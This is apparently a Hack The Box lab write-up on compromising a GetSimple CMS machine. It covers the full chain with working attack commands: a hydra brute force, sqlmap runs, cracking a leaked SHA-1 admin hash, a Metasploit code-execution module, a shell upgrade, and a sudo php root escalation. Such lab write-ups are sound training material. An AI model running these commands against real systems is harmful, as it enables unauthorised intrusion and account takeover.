---
title: "Htb_writeup_0"
date: 2023-05-01T15:26:31+02:00
draft: false
toc: false
images:
tags: 
  - untagged
---

# Target info
- Target ip: 10.129.116.132

Did an nmap scan `nmap -sV --open -A 10.129.116.132 > initial_scan.txt`
# Ports
```nmap-scan
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-robots.txt: 1 disallowed entry 
|_/admin/
```

Checked the website with `Crtl + u` on Firefox. Found the host `gettingstarted.htb`. Added it to `/etc/hosts`.
It also says that the website uses the GetSimple CMS.
/admin/ seems interesting. Let's check it out.
There is a login portal for admins.
Performing a gobuster scan. Found the following interesting paths:
```gobuster-scan
/plugins
/data
/backups
```

Found a plugin `InnovationPlugin` in `/plugins`. Let's search for vulns.
Nothing for the plugin, but found something, [this exploit](https://www.exploit-db.com/exploits/40008) for the Getsimple CMS.
We don't know the version of the plugin, so let's see if it's vulnerable and try to get a reverse shell.
So, we can use it, after we login to the admin page. We have our way in, now we need to find a way to get the admin password, or login to the admin panel in some other way. I'll try hydra, and see if there is no blacklisting in place.
Let's build the command. First let's get rockyou.
The request for login has the format:
`http://gettingstarted.htb/admin/index.php?userid=username&pwd=password&submitted=Login`
Let's try
hydra -L ~/gs/user-dict.txt -P ~/rockyou/rockyou.txt gettingstarted.htb http-form-post '/admin/index.php:userid=^USER^&pwd=^PASS^&submitted=Login:F=Login failed. Please double check'
A lof of false positives, not sure why. Probably overloaded the server, needed to restart the machine. The found passwords don't seem to work.

Trying SQLMAP with a request copied from burp.
`sqlmap -r gs/login_r.txt -p pwd --risk 3 --level 5 --batch`
SQMap scan complete, doesn't seem to be injectable. Gonna retry with the user param.
`sqlmap -r gs/login_r.txt -p userid --risk 3 --level 5 --batch`
SQLMAP in progress #tochange

Found admin credentials while going trough the /data subfolder in:
`http://gettingstarted.htb/data/users/admin.xml`
No idea why I didn't try this sooner. It's always the easy answer, isn't it?
```xml
<item>
	<USR>admin</USR>
	<NAME/>
	<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
	<EMAIL>admin@gettingstarted.com</EMAIL>
	<HTMLEDITOR>1</HTMLEDITOR>
	<TIMEZONE/>
	<LANG>en_US</LANG>
</item>
```
So we got the credential pair of
admin:d033e22ae348aeb5660fc2140aec35850c4da997
The password in this format doesn't work. It's probably hashed, or encoded. Let's try decoding it first with cyberchef, and if that doesn't work, we try hashcat.
Decoding in cyberchef doesn't seem to work. Let's try to identify the type of hash then. 
`hashidentifier d033e22ae348aeb5660fc2140aec35850c4da997`
gives the following results
```hashindentifier-results
Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```
Ok. I would guess it's SHA1 or MySQL5 SHA-1. Let's try to crack both in rockyou with hashcat and see how it goes.
`hashcat -m 100 -a 3 -o outhash.txt d033e22ae348aeb5660fc2140aec35850c4da997`
It was indeed SHA1. The cracked hash is `admin`. Admin. Really? I could've checked that. xD
Let's use the exploit we found earlier to gain a shell.
Seems like the button is broken, due to Flash Player getting discontinued. Let's try to find vulns in metasploit. Found `exploit/multi/http/getsimplecms_unauth_code_exec`
Let's try that
Okay, the exploit worked, I got a shell. Upgraded it with
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
We are logged in as the `www-data` user. We have enough privelage, to get the user flag from `/home/mrb3n/user.txt`, so we cat it out. Nice.

# Privelage Escalation
Let's try `LinEnum.sh` first, since this is what HTB reccomended.
But before that, it would be nice to check if we can get an SSH session going.
We cannot. Before even uploading the script, I checked for what we can do as root without a password, with `sudo -l`
Bingo! We can run `/usr/bin/php` from the current user. Let's try to leverage that.
GTFOBins shows us that we can use `sudo php -r "system('/bin/bash');"` to get sudo access. Let's try that.
And it worked! We cat the flag
`cat /root/root.txt`

# Summary
## Path taken
1. Recon
2. Use metasploit to get a shell
3. Get the user flag
4. Use PHP to escalate the privelages to root
5. Get the root flag
## Conclusions
Should probably see everything I can with the browser and Burp, before moving on to automated tools. Check every potential file of interest.
